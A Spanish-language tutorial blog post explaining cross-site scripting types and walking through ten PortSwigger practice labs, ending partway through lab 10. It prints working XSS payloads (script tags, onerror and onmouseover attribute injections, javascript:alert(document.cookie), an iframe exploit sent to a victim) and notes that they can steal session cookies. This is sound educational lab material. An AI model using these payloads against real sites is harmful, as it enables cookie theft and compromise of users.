---
layout: single
title: XSS - Laboratorios de PortSwigger
excerpt: "Explicación sobre XSS desde cero, mostraremos ¿qué es un XSS?, cross site scripting, y también sus tipos y resolveremos laboratorios de practica en la plataforma portswigger para practicar esta vulnerabilidad web."
date: 2023-05-21
classes: wide
header:
  teaser: /assets/images/XSS/banner.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - javascript
  - XSS
  - PortSwigger
---

<br>

# ¿Qué es XSS?

La vulnerabilidad XSS (cross site scripting), es una vulnerabilidad que nos permite inyectar codigo malicioso, comunmente los ataques se hacen usando javascript, esta vulnerabilidad se acontece cuando el desarrollador de la web no valida ni filtra adecuadamente los datos que son ingresados por el usuario antes de ser mostrada en la página web.

<br>

El funcionamiento de esta vulnerabilidad radica en que un atacante puede ingresar código malicioso en algun campo de entrada de datos, como lo puede ser un buscador en la web, algún comentario, o cualquier campo que nos permita ingresar datos y dichos datos se vean reflejados, ya sean temporalmente o no.

<br>

Y digo temporalmente o no ya que existen diferentes tipos de XSS, los más comunes son:

XSS Reflejado(reflected): Esto sucede cuando el código inyectado es interpretado por el servidor web y nos manda la respuesta de dicho codigo ya que nuestro navegador recibe esa respuesta y nos la muestra.

XSS Almacenado(Stored): Es cuando el código inyectado se almacena dentro de los servidores de la web, por ejemplo, si hacemos un comentario donde gracias a la vulnerabilidad cualquier codigo javascript comentado en la web se interpretará en lugar de se un simple comentario, y como los comentarios se guardan en una base de datos, entonces esta respuesta que obtuvimos no solo será visible para nosotros, si no que cualquier persona que entre a la web y vea el comentario podrá leer la respuesta del código que inyectamos en un inicio.

XSS Dom-Based: Este ataque es cuando el código es inyectado en el DOM(Modelo de objetos del documento) de la página web, y el DOM es una estructura que se utiliza para poder leer el código de una mejor forma para los desarrolladores, el DOM tiene una estructura de arbol, donde se separan los elementos HTML de la web como objetos en este DOM, una imágen representativa de ejemplo es la siguiente:

![DOM](/assets/images/XSS/DOM.png)

Podemos apreciar como se divide en un formato de multiples objetos y se separa la web para una mejor readacción y corrección en caso de ser necesario.

Ahora que ya entendimos un poco sobre lo que es el DOM, seguiremos explicando el XSS basado en DOM, Así que una vez inyectado el código en el DOM, entonces podremos obtener una respuesta del servidor vulnerable y la veremos reflejada en el campo que nos devuelve algún valor por defecto pero obviamente nos devolvera lo que hemos inyectado ya que estamos reemplazando ese valor por un código malicioso directamente en el DOM, y esto no se almacena en los servidores, ya que estamos modificando la estructura actual de la web, de todos modos lo veremos más adelante con laboratorios para entender esto de mejor forma.

<br>

# Laboratorio 1: XSS reflejado en contexto HTML sin nada codificado

Vemos que en este primer laboratorio nos piden hacer lo siguiente:

![lab1](/assets/images/XSS/lab1/lab1.png)

Dice que este laboratorio contiene un XSS simple reflejado(reflected), en la función de busqueda.

Y que para terminar este laboratorio debemos llamar a la función de alert que ejecuta javascript.

<br>

Lo primero que haremos al entrar al laboratorio es ver la función de busqueda:

![search](/assets/images/XSS/lab1/search.png)

Podemos ver que esta la función de busqueda, buscaremos cualquier cosa, por ejemplo "Hola":

![hola](/assets/images/XSS/lab1/hola.png)

Vemos que no ha encontrado resultados, pero es no nos interesa, lo que nos interesa es que sabemos que la vulnerabilidad se encuentra en este apartado de la web, y que los datos que estamos ingresando como usuario se ven reflejados en la respuesta, buscamos "Hola" y en la respuesta nos dice: 0 search results for "Hola", por lo que estamos viendo lo que ingresamos en la respuesta, y si es vulnerable a este XSS simple refjeado, entonces al meter código en la busqueda en lugar de alguna busqueda nos debería interpretar ese codigo.

Como el reto de este laboratorio es desplegar un mensaje de alerta es lo que agregaremos como código inyectado:

```js
<script>alert(1)</script>
```

> De esta forma en javascript llamamos a la función de alerta para que nos muestre un mensaje en pantalla de la web.

![script](/assets/images/XSS/lab1/script.png)

Así que al buscar esto, el servidor interpretara nuestro código javascript inyectado ya que por detras no se esta securizando la entrada de datos por lo que pueden pasar cosas como estas y que el servidor logre interpretar lo que queremos.

Así que al darle en "search", se enviará la petición y veremos que nos ha respondido la alerta:

![alert](/assets/images/XSS/lab1/alert.png)

Vemos el mensaje de alerta lo cual indica que esto es vulnerable y habremos terminado con este laboratorio ya que el objetivo era esto, algo simple.

![end](/assets/images/XSS/lab1/end.png)

<br>

# Laboratorio 2: XSS almacenado en contexto HTML sin nada codificado

![lab2](/assets/images/XSS/lab2/lab2.png)

Este laboratorio nos dice que existe una vulnerabilidad XSS almacenada(stored) en la sección de comentarios, así que al abrir algún producto del laboratorio vemos la siguiente sección de comentarios:

![comentarios](/assets/images/XSS/lab2/comentarios.png)

Como podemos ver, tenemos la posibilidad de dejar comentarios en esta página web, y como estos comentarios se almacenan en los servidores para que todos los usuarios puedan verlos, entonces en caso de que podamos acontecer un XSS aquí en un comentario entonces no solo lo veriamos nosotros, si no que también todos los que entren a esta sección de la web.

Así que intentaremos dejar un comentario llamando a la función alert de javascript:

```js
<script>alert(1)</script>
```

![script](/assets/images/XSS/lab2/script.png)

Y ahora posteamos el comentario:

![posted](/assets/images/XSS/lab2/posted.png)

Y ahora cualquier persona que entre a este apartado de la web le saldrá la siguiente alerta:

![alert](/assets/images/XSS/lab2/alert.png)

Ya que el comentario que pusimos contiene el código javascript lo cual hace que cada que entren esta función se ejecute mostrandonos el mensaje ya que se guardo dentro de la base de datos y el servidor mismo lo interpreta y nos lo muestra.

Y con esto habremos completado este laboratorio:

![end](/assets/images/XSS/lab2/end.png)

<br>

# laboratorio 3: DOM XSS in document.write sink using source location.search

![lab3](/assets/images/XSS/lab3/lab3.png)

En este laboratorio vemos que dice que contiene una vulnearbilidad XSS en la función de busqueda.

Nos dice que por detras existe la función **document.write** la cual encontramos aquí viendo la fuente de la web:

![documentwrite](/assets/images/XSS/lab3/documentwrite.png)

Y vemos que encontramos la siguiente función buscando por "document.write":

```js

function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}
```

Y viendo el código vemos que se usa **document.write** para mostrar resultados en la página.

Y en la función principal de este ejemplo llamada **trackSearch**, recibe un parametro llamado **query**, y vemos que en la linea de:

```js
document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
```

Solamente lo esta concatenando en la parte de **document.write**, sin filtros, ni nada para evitar un ataque XSS, simplemente se está pasando concatenado en el recurso cargado que en este caso es una imagen .gif y seguido de eso se esta concatenando de marena erronea, ya que el parametro pasado que es **query** contiene los datos que le hemos pasado como busqueda en la función de busqueda de la web.

Y esto es un error, ya que como no se esta sanitizando la entrada de datos, y simplemente se estan concatenando directamente en la consulta, entonces podriamos inyectar código javascript, y como estamos viendo como funciona esto, será facil evadir el valor de las comillas y escapar para que nos interprete nuestro código javascript.

<br>

Para ello vemos que al final donde se esta concatenando el valor query, esta encerrado entre comillas simples, y anterior a eso hay unas comillas dobles, y anterior a eso estamos dentro de un `<img src` el cual debemos cerrar para posteriormente agregar nuestro código.

Así que para salir de las comillas simples y dobles y también para cerrar el `<img src` haremos lo siguiente, pondremos esto en la función de busqueda de la web:

`'"><script>alert(1)</script>`

> Lo que estamos haciendo es cerrar el contenido de la primera comilla simple por detras, así que ahora cerramos las siguientes comillas dobles poniendo `"` y por ultimo con `>` cerramos el <img scr>, seguido de nuestro script invocando a la función de alerta ya que el objetivo de este nivel es hacer esto.

Una vez hagamos la busqueda de esto, por detras habremos escapado de las comillas y del img src, lo que ocacionara que nuestro código sea interpretado por el servidor mostrandonos lo deseado:

![alert](/assets/images/XSS/lab3/alert.png)

Podemos apreciar el mensaje de alerta, y podemos ver que hemos completado este laboratorio:

![end](/assets/images/XSS/lab3/end.png)

> Debajo de la busqueda podemos ver `">` que son los valores que quedaron fuera ya que cerramos nosotros los anteriores quedando esos recorriendose hasta el final, y aparecen ahí ya que ahí es donde debía mostrarse la imagen.gif de la cual abusamos para que funcione nuestro XSS-DOM-based.

<br>

# Laboratorio 4: DOM XSS in innerHTML sink using source location.search

En este cuarto laboratorio de XSS basado en DOM, vemos que nos dice lo siguiente:

![lab4](/assets/images/XSS/lab4/lab4.png)

Nos dice que tiene una vulnerablidad XSS Dom-Based, en la función de busqueda, y que usemos una asignación de HTML interna que cambia el contenido HTML de un elemento div usando los datos que obtenemos de **location.search**, y que para terminar este laboratorio debemos mostrar una alerta como anteriormente lo hemos estado haciendo.

![location](/assets/images/XSS/lab4/location.png)

Filtrando en el código de la web por **location.search**, encontramos un código parecido al del laboratorio anterior, este código que encontramos es este:

```js
function doSearchQuery(query) {
	document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
```

Primero vemos que se esta usando **document.getElementById**, lo que hace esto es que se utiliza para obtener una referencia a un elemento dentro del DOM mediante su identificador unico, donde en este caso el identificador unico que es lo que esta dentro, es **searchMessage**, y buscando en el código de la web este id, encontramos lo siguiente:

![search](/assets/images/XSS/lab4/search.png)

Vemos la linea:

```js
<span id="searchMessage">Prueba</span>
```

Y descubrimos que este identificador único hace referencia a nuestro texto de entrada en la función de busqueda, ya que buscamos "Prueba" y vemos que se guarda en ese id.

Entonces sabemos que el valor de **SearchMessage** del código hace referencia a ese lugar.

Y como abajo vemos que se llama a esa función y gracias a eso podemos ver lo que ingresamos como datos en la respuesta de la web.

Entonces haremos lo siguiente:

![onerror](/assets/images/XSS/lab4/onerror.png)

```js
<img src=noexist onerror=alert(1)>
```

Lo que estamos haciendo con esta linea es que la web tome nuestros datos de entrada, y como esta usando **innerHTML**, nos leera nuestro código inyectado y lo interpreatara, gracias a que no se esta sanitizando la entrada de los datos en el código de la web.

Y lo que hace esa linea es cargar una imagen que no existe, forzando que se redirija al caso de error de la derecha lo cual lo que hará es ejecutar una alerta que le hemos dicho que haga.

Y como estamos forzando que esto sucedea, al buscar esto veremos que nos responde lo siguiente:

![alert](/assets/images/XSS/lab4/alert.png)

Y habremos terminado este laboratorio:

![end](/assets/images/XSS/lab4/end.png)

<br>

# Laboratorio 5: DOM XSS in jQuery anchor href attribute sink using location.search source

En este laboratorio nos dan las siguientes instrucciones:

![lab5](/assets/images/XSS/lab5/lab5.png)

Nos dice que este laboratorio contiene un XSS Basado en DOM, el cual se encuentra en la página de feedback, también nos dice que debemos utilizar la función selectora $ de la biblioteca de Jquery, esto para encontrar un elemento ancla(anchor) y cambiar su atributo href, utilizando datos de location.search.

La función selectora $, es una función que esta integrada en la biblioteca de Jquery, y esto lo que nos permite hacer es seleccionar elementos HTML y nos sirve para manipular el DOM.

Y lo que nos dice de encontrar un elemento ancla y cambiar su atributo href, se refiere a que debemos encontrar ese atributo href al que menciona el $ de jquery que debemos encontrar en el código de la web, y revisar de que forma podriamos manipular los datos de entrada.

<br>

Primero al ir a la sección de **Submit feedback** como nos dice el laboratorio vemos lo siguiente:

![feedback](/assets/images/XSS/lab5/feedback.png)

Así que analizando un poco el código de la web encontramos lo siguiente:

![back](/assets/images/XSS/lab5/back.png)

```js
<a id="backLink" href="/post">Back</a>
```

Lo que hace esta linea de HTML, crea un enlace con el texto **Back**, que al darle click te redirijira a la ruta **/post** de la web, y este enlace tiene un identificador unico ID, el cual tiene como valor **backLink** para acceder a el.

Y más abajo de esto encontramos lo siguiente:

![function](/assets/images/XSS/lab5/function.png)

```js
$(function() {
  $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Y lo que esta sucediendo aqui es que con jquery, se esta seleccionando un elemento el cual tiene un identificdor unico ID con el valor de **backLink**, el cual ya habiamos visto antes, y vemos que se esta tomando el valor del parametro **returnPath**, y después esto se envia al atributo **href** del enlace, el cual es **backLink** y sabemos que este enlace te lleva a:

```js
<a id="backLink" href="/post">Back</a>
```

Así que si como atacantes podemos tener acceso a la entrada del parametro **returnPath** podriamos ingresar código malicioso y si no esta sanitizado entonces se interpretaria nuestro código malicioso.

<br>

Hagamos una prueba, como podemos ver, en la página en la que estamos de **Submit feedback**, si miramos bien en la URL, tenemos acceso a dicho parametro, ya que la petición se tramita por el metodo **GET**, por lo que tenemos acceso a dicho parametro como podemos observar en la URL:

![url](/assets/images/XSS/lab5/url.png)

`feedback?returnPath=/post`

Podemos apreciar que en este caso por defecto esta /post, lo cual nos llevaría al post anterior, pero como nosotros podemos manipular esta entrada de datos, intentaremos inyectar nuestro código malicioso, el cual es mostrar una alert de una cookie como nos pide el objetivo del laboratorio, así que la ingresaremos:

`feedback?returnPath=javascript:alert(document.cookie)`

![code](/assets/images/XSS/lab5/codemalicious.png)

Lo que estamos haciendo aqui es ingresar codigo que se interprete usando javascript, y lo que hace es mostrarnos una alerta con el valor de la cookie.

Y ahora si revisamos el código de la web:

![value](/assets/images/XSS/lab5/value.png)

Podemos apreciar que el valor que estaba por defecto el cual era **/post** se ha reemplazado por nuestro código malicioso y también se ha interpretado, así que ahora cada que demos click en el boton de **"Back"** nos mostrara la alerta con la cookie, y esto es ya que hemos modificado el valor al cual hacia referencia la entrada por defecto, cambiandola por nuestro código malicioso y todo gracias a que tuvimos acceso de entrada de datos a dicho parametro.

Y habremos terminado el laboratorio:

![end](/assets/images/XSS/lab5/end.png)

<br>

# Laboratorio 6: DOM XSS in jQuery selector sink using a hashchange event

En este laboratorio nos dice lo siguiente:

![lab6](/assets/images/XSS/lab6/lab6.png)

Nos dice que este laboratorio tiene una vulnerabilidad XSS basada en DOM, la cual se encuentra en la página de inicio.

También nos dice que usa la función selectora $() de Jquery para desplazarnos automaticamente a una publicación asignada, y el valor de la publicación asignada se le asigna a través de la propiedad **location.hash**.

Para entender mejor veamos lo siguiente.

<br>

Primero analizaremos el código de la web, y buscando por **hashchange** encontramos lo siguiente:

![home](/assets/images/XSS/lab6/home.png)

```js
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
```

Lo que hace este código es la función que hace que nos podamos desplazar automaticamente a una publicación usando el #, por ejemplo, si en alguna pagina web con multiples secciones por ejemplo, indice,manual,etc. si queremos ir a manual automaticamente debemos agregar el simbolo de #, al final de la url, quedando algo así:

`https://prueba.com/#Manual`

Esto nos situara automaticamente en la página que tenga el elemento "Manual", y nos llevara a esa sección ya que previamente se ha configurado una función como la del codigo javascript y para saber como funciona este código de js.

A continuación, detallo el funcionamiento del código:

Lo que hace ese código a detalle, es que primero selecciona los elementos que se encuentra entre las etiquetas `<h2>` de HTML utilizando el selector de CSS, **section.blog-list h2**, que con esto obtenemos todos los titulos de los post en la web, así que por el momento selecciona todos los titulos para despues hacer una comparacion y ver cual coincide con nuestra busqueda en el #.

Y podemos apreciar que en efecto los titulos de los post se guardan entre estas etiquetas:

![h2](/assets/images/XSS/lab6/h2.png)

Vemos en el código de la web que todos los titulos estan guardados entre las etiquetas `<h2>`, por lo que por eso guardamos todos los elementos que esten dentro de estas etiquetas en la página web de inicio.


Una vez tenga estos titulos guardados, lo que hace es usar la función **decodeURIComponent()**, la cual dentro de ella tiene los siguientes parametos:

```js
decodeURIComponent(window.location.hash.slice(1))
```

Primeramente, lo que hace **window.location.hash**, es que filtra el valor que pusimos como parametro de busqueda pero este se devuelve con todo y el #.

Por ejemplo, si la URL completa con nuestra busqueda de **"Carros"** es:

`https://prueba.com/#Carros`

Entonces la función anterior, debería devolver:

`#Carros`

Pero como la función aún no termina y vemos otro valor el cual es: **slice(1)**, entonces lo que hace esto es eliminar el primer caractér, el cual es el #, quedandonos solo el valor:

`Carros`

Y ahora con este valor que pasamos decodificado, se usa la función **:contains()** que lo que hace es seleccionar nuestro elemento anteriormente guardado, y después este elemento se compara con los que tomamos de la lista **section.blog-list** en un principio.

Y por último, en caso de que nuestro elemento ingresado coincida con alguno de la lista, entonces nos lleva ahí usando la función **scrollIntoView()**.

Así que en resumen, lo que hace este código de javascript, es que como dije antes, nos permite ir a alguna sección de la página web, utlilizando el valor de la URL y haciendo modificaciones en el DOM podemos lograr esto.

<br>

Pero por otro lado, este código no es del todo seguro, pues en el código anterior, recide un pequeño detalle, que podría convertirse en algo peligroso.

Y me refiero a que al momento de recibir la entrada del usuario, no se esta aplicando ningun filtro de seguridad, así que veamos a lo que me refiero:

En el código vemos la siguiente linea:

```js
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
```

Como recordamos, la función **decodeURIComponent()** en este caso la usamos para filtrar el valor de busqueda pasado por medo de la URL, y lo obtenemos sin el # como ya lo sabemos.

Pero como no se esta realizando ningun tipo de filtro de seguridad, para evitar que el código malicioso se interprete, entonces un atacante podría meter código directamente como si fuese una busqueda de alguna sección en la página web, pero en verdad es código malicioso que como no hay filtros, entonces se interpretará ejecutando la acción deseada del atacante.

Por ejemplo:

`https://prueba.com/#<script>alert('Vulnerable')</script>`

Lo que sucederá es que como no hay filtros como había dicho anteriormente, entonces esto se ejecutará en nuestro navegador usando como base la página web.

> Por esto es importante saber sanitizar código, sobre todo en las entradas de datos.

Así que con esto, estamos más cerca de lograr el objetivo de este laboratorio, el cual es crear una URL para que al enviarsela a la victima, se le ejecute la función **print()** de javascript.

Así que sabiendo esto, haremos la siguiente URL maliciosa:

`<iframe src="https://prueba.com/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

La función que tiene la etiqueta **iframe** es que primero carga la web que esta en su src, que en este caso es la URL del laboratorio, pero como sabemos que lo anterior es vulnerable a XSS gracias a la función de javascript no sanitizada, entonces agregamos el # para inyectar nuestro código, y este código es el siguiente.

Cuando ya se termine de cargar la URL del iframe, entonces lo que sucederá es que el evento **onload** se ejecutará, y esto lo que hace es que agrega dinamicamente la linea:

```js
<img src=x onerror=print()>
```

Al final de la URL en el src del iframe, sabemos que esta pequeña linea lo que hace es cargar una imagen inexistente para después forzar un error y ejecutar en este caso la función print().

Así que una vez el iframe se cargo, pasará de ser:

`https://prueba.com/#`

A ser:

`https://prueba.com/#<img src=x onerror=print()>`

De esta forma como hay un cambio, entonces como hubo un cambio, el iframe lo detecta, cargandonos la nueva URL y aqui es donde se acontece la vulnerabilidad ya que al hacer esto, ya nos estaría interpretando nuestro código malicioso.

Se hace en forma de una linea de código ya que así nos lo pide el laboratorio, pero en un caso real sería algo así:

`https://test.com/#onload="this.src+='<img src=x onerror=print()>'"`

Ya que al enviar a alguien esta URL, le interpretará el código inyectado, aconteciendo la vulnerabilidad de su lado, de esta forma se puede llegar a robar cookies de sesion, o más cosas del estilo.

Así que al enviar este código final al atacante:

![exploit](/assets/images/XSS/lab6/exploit.png)

Podemos ver que al dar en enviar exploit a la victima, hemos resuelto el laboratorio:

![fin](/assets/images/XSS/lab6/fin.png)

<br>

# Laboratorio 7: Reflected XSS into attribute with angle brackets HTML-encoded

En este siguiente laboratorio, vemos que nos dice lo siguiente:

![lab7](/assets/images/XSS/lab7/lab7.png)

Dice que este laboratorio tiene una vulnerabilidad XSS Reflected(Reflejada), en la función de busqueda de la web, y nos dice que para completar este laboratorio debemos inyectar un atributo al código y llamar a la función alert().

Al entrar a la web, y buscar algo nos carga lo siguiente:

![prueba](/assets/images/XSS/lab7/prueba.png)

Vemos que es un buscador normal, y no vemos nada extraño, por lo que abriremos la herramienta para inspeccionar el código de la web, y para encontrar donde esta la vulnerabilidad, podemos intuir que el XSS recide en la entrada de datos, por lo que filtraremos por nuestra palabra que buscamos para ver que se esta haciendo con ese valor dado, en este caso filtramos por **"Prueba"** ya que fue lo que buscamos.

Y encontramos lo siguiente:

![html](/assets/images/XSS/lab7/html.png)

```js
<input type="text" placeholder="Search the blog..." name="search" value="Prueba">
```

Podemos apreciar que en esta linea, cuando se recibe el valor de nuestra busqueda que en este caso se almacena en **value**, y vemos que no esta muy bien creada esta parte, ya que de no estar sanitizada la entrada de datos, podriamos llegar a inyectar código javascript y que el servidor lo interprete.

Para ello, intentaremos escapar de las comillas dobles, e intentar inyectar nuestro código, que en este caso, nos piden mostrar un alert através de un atributo.

Si vemos bien en la linea de código, vemos que la sintaxis es un atributo, seguido de su valor: type es "text", placeholder es "Search the blog...", name es "search", y por último value es al que tenemos entrada.

siguiendo esta sintaxis, entonces debemos agregar un atributo que nos permita ver reflejado el código javascript que estará dentro de el.

<br>

Para ello podemos usar el atributo **onmouseover**, que en pocas palabras lo que hace este atributo es que al momento que el cursor pase encima de donde se esta usando, se muestre lo que le indiquemos automaticamente al pasar el cursor por encima de ese elemento, que en este caso es en el elemento HTML de entrada que recibe el buscador web.

Ahora con lo anterior en cuenta, entonces ya sabemos lo que hará al meter el siguiente valor en la función de busqueda:

![mouse](/assets/images/XSS/lab7/mouse.png)

```js
Prueba"onmouseover="alert(1)
```

Lo que estamos haciendo en esto, es que primero, estamos poniendo el valor que recibira el atributo **value**, que en este caso es "Prueba", pero seguido de eso usamos unas comillas dobles, y esto es para poder cerrar el atributo **value**, y procedemos a escribir el nuevo atributo que como sabemos es **onmouseover** del cual ya sabemos su función, dandole como valor la función alert() de javascript, pero notamos que después de poner el = hay otras comillas dobles.

Y esto es para que tome la sintaxis de los atributos anteriores, y al final no pusimos otras comillas dobles, ya que como sabemos, al momento de poner las primeras que usamos para cerrar el atributo **value**, estas comillas dobles por detras se arrastraron hacia el final, y aqui no ponemos nada ya que por detras ya hay unas comillas dobles que nos cerrararan el valor del atributo inyectado.

Así que en teoria por detras debería verse así:

```js
<input type="text" placeholder="Search the blog..." name="search" value="Prueba" onmouseover="alert(1)">
```

> Aunque no hayamos dado un espacio para separar un atributo del otro no importa ya que automaticamente se agregan evitando errores.

Así que al tramitar esta busqueda podemos ver lo siguiente:

![alert](/assets/images/XSS/lab7/alert.png)

Podemos apreciar que cada que pasemos el cursor por encima de la función de busqueda donde ahí recide el input del atributo **value**, entonces en esa parte podremos ver que se ejecuta el atributo **onmouseover** haciendo lo que le indicamos, que en este caso fue mostrar una alerta.

Y Como anteriormente intuimos lo que pasaría por detras, en efecto fue así:

![injection](/assets/images/XSS/lab7/injection.png)

Y terminamos este laboratorio:

![end](/assets/images/XSS/lab7/end.png)

<br>

# Laboratorio 8: Stored XSS into anchor href attribute with double quotes HTML-encoded

En este laboratorio nos piden lo siguiente:

![lab8](/assets/images/XSS/lab8/lab8.png)

Podemos leer que nos dice que este laboratorio contiene un XSS almacenado(stored), y que este XSS se encuentra en la sección de comentarios.

Nos dice como objetivo que debemos hacer que al momento que al darle click al autor de un comentario, nos muestre una alerta.

Así que primero al entrar a la sección de comentarios vemos lo siguiente:

![comentarios](/assets/images/XSS/lab8/comentarios.png)

Podemos apreciar algunos comentarios, y también un apartado donde podemos publicar el nuestro, primero ingresaremos un comentario normal, para después revisar su comportamiento en el código de la web:

![comentar](/assets/images/XSS/lab8/comentar.png)

He dejado un comentario con esos datos, y se ve así al postearlo:

![prueba](/assets/images/XSS/lab8/prueba.png)

Así que al momento de leer el código de la web, vemos lo siguiente:

![codigo](/assets/images/XSS/lab8/codigo.png)

Podemos apreciar que hay diferentes elementos, como una imagen del usuario que hizo el comentario, nuestra referencia a la web dada en el comentario, y también el comentario obviamente.

<br>

Lo que me llama la atención es que cuando se esta pasando el valor de la página web del usuario que comenta, es que se ve que en el input hay un **href**, el cual contiene el valor de la web dada por el comentario, pero al parecer la entrada de datos no esta sanitizada.

Por lo que podriamos intentar inyectar código en lugar de proporcionar una web.

Así que probaremos lo siguiente en un nuevo comentario:

![comentario2](/assets/images/XSS/lab8/comentario2.png)

Podemos ver que en lugar de una web, hemos indicado que se ejecute la función **alert()** usando javscript:

```js
javascript:alert(1)
```

Así que al comentar esto, veremos el nuevo comentario:

![nuevo](/assets/images/XSS/lab8/nuevo.png)

Podemos ver que se agrego correctamente, y si esta parte de la web es vulnerable, entonces al darle click a nuestro nombre de autor marcado en morado, se supone que nos mostrará la alerta que inyectamos:

![uno](/assets/images/XSS/lab8/uno.png)

Y apreciamos que en efecto funciona nuestro XSS almacenado, ya que la entrada de datos en la parte de página web del autor no estaba bien sanitizada, por lo que al leer el código nuevamente, podemos apreciar lo siguiente:

![dan](/assets/images/XSS/lab8/Dante.png)

Vemos que se quedo almacenado el comentario junto a el XSS que creamos.

Así que hemos terminado este laboratorio:

![fin](/assets/images/XSS/lab8/fin.png)

<br>

# Laboratorio 9: Reflected XSS into a JavaScript string with angle brackets HTML encoded

En este laboratorio leemos lo siguiete:

![lab9](/assets/images/XSS/lab9/lab9.png)

Primero nos dice que este laboratorio con tiene una vulnerabilidad XSS Reflejada(reflected), y nos dice que la vulnerabilidad acontece en la función de busqueda al momento de ingresar datos en la busqueda.

Al entrar al laboratorio y buscar algo notamos lo siguiente:

![prueba](/assets/images/XSS/lab9/prueba.png)

Notamos que al ingresar a la web tenemos una entrada de datos, la cual llenamos con algun valor como "Prueba" en el campo de busqueda.

Así que al filtrar por esto en el código de la web, vemos lo siguiente:

![javascript](/assets/images/XSS/lab9/javascript.png)

```js
var searchTerms = 'Prueba';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

Podemos ver que se esta recibiendo el valor ingresado en la web, y se esta guardando en la variable **searchTerms**, sin embargo, si miramos bien, cuando se esta usando el metodo document.write, vemos que se esta pasando la variable **searchTerms** directamente a dicho metodo, así que esta manera no es muy segura de evitar XSS, ya que al tener acceso a la entrada de datos, que es la variable searchTerms, podríamos encontrar una forma de escapar de esa variable, inyectando nuestro código y lograr que el servidor lo interprete.

Para intentar escapar de esta variable, haremos uso de comillas simples, ya que como sabemos, la variable se esta guardando así:

`var searchTerms = 'Prueba';`

Y si nuestro valor en lugar de prueba es '-alert(1)-' entonces lo que estara pasando por detras es esto:

`var searchTerms = ''-alert(1)-';`

Vemos que la variable **searchTerms** obtuvo una cadena vacia, ya que la cerramos, y en su lugar inyectamos la alerta, y de esta forma estariamos escapando de la asignacion de variable, y como se esta pasando directamente a el metodo **document.write**, entonces esta vulnerabilidad se acontecera:

![alert](/assets/images/XSS/lab9/alert.png)

Vemos que ha funcionado, y al leer el código de la web:

![code](/assets/images/XSS/lab9/code.png)

Podemos apreciar que sucedio lo que esperabamos, logramos salir del valor de la variable para después meter nuestro propio código y que no forme parte del texto ingresado, así que habremos terminado este laboratorio:

![end](/assets/images/XSS/lab9/end.png)

<br>

# Laboratorio 10: DOM XSS in document.write sink using source location.search inside a select element

Nos dice que este laboratorio contiene una vulnerabilidad XSS en la función de verificar existencias de un producto.

Nos dice también que utlilza la función **document.write** de javascript para escribir datos en la página.

Y también que **document.write** maneja con datos que se sacan de **location.search** y saca valores de la petición que contiene parametros en la web, los cuales podemos manipular.

Y como objetivo nos pide escapar del valor del parametro inyectando nuestro código javascript que en este caso es una alerta.

<br>

Así que primero vamos a la función de verificar existencias de un producto, y vemos lo siguiente:

![funcion](/assets/images/XSS/lab10/funcion.png)


Podemos apreciar que al darle a **Check Stock** nos muestra el resultado de la función, más no lo que hay por detras, así que para esto interceptaremos la petición al momento de darle a ese boton, y veremos los siguientes datos en la petición:


![intercept](/assets/images/XSS/lab10/intercept.png)

Podemos apreciar en la petición que esta vez es por metodo POST, por lo que no veremos directamente en la URL los parametros asignados, si no que ahora los vemos en la petición como vemos en la imagen, vemos que hasta abajo estan los parametros:

`productId=1&storeId=London`

Así que usando el inspector de elementos del navegador buscamos esos parametros y encontramos el primero que es **productId**:

![pid](/assets/images/XSS/lab10/productid.png)

Pero viendo su código no encontramos algo interesante, ya que no se usa para algo más ese parametro, ni se llama en alguna otra función así que pasaremos al siguiente.

Y en el que encontramos algo interesante fue en el de **storeId**:

![js](/assets/images/XSS/lab10/js.png)

```js
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
  document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
  if(stores[i] === store) {
      continue;
  }
  document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

Lo que hace este código es lo siguiente:

Primero crea un arreglo llamado **stores**, el cual contiene los valores "London", "Paris" y "Milan".

Después en la segunda linea del código se esta creando una variable llamada **store**, la cual hace que obtengamos el valor del parametro **storeId**, por ejemplo si el valor del parametro **storeId** es "London", entonces la variable **store** valdra "London".

En la tercerea linea usamos **document.write()** para empezar a escribir datos en el código de la web actual, y lo primero que escribimos es la etiqueta `<select name="storeId">`.

Esto lo que hará es que primero la etiqueta `<select>` sirve para crear un menú desplegable en el cual los usuarios pueden elegir una opción y estas opciones se deben definir, y lo que esta dentro de esta etiqueta que es el **name** con el valor **"storeId"**, lo que esta haciendo aqui es que crea un nombre de control, y con nombre de control se refiere a crear un parametro por el cual cuando el usuario eliga su opción, entonces ese parametro **storeId** tomara el valor del elemento seleccionado del menú desplegable, y dejamos la etiqueta `<select>` sin cerrar para ir agregando opciones que el usuario pueda elegir en el menú desplegable.

En la cuarta linea, estamos usando un if, para comprobar si el parametro **store** tiene contenido, y en caso de tenerlo, entra a el if.

En la quinta linea se llama a otra función para escribir en el código de la web **document.write()**, y lo que escribimos es lo siguiente: `<option selected>'+store+'</option>` y lo que hace la etiqueta `<option>` es agregar una opción al menú desplegable, pero como estamos usando el atributo **selected** , esto quiere decir que el valor que le pasemos será el que se posicionara en primer lugar por defecto seleccionado en la web, y ese valor es **store**, el cual contiene el valor pasado por el parametro en la petición, y cerramos la opción con `</option>`.

Y por último, lo que hace el resto del código es que crea un bucle for, el cual recorre cada valor del arreglo **stores**, y compara si el valor actual de **stores** es igual al valor pasado por el parametro **store**, y si es igual entonces se omite esta parte, pero en caso de que el valor actual de **stores** no sea igual al de **store** entonces este valor se agregará a la lista usando **document.write()** con el elemento actual a agregar, de esta manera evitamos duplicados en el menú desplegable.

Y por último se cierra el menú desplegable.

<br>

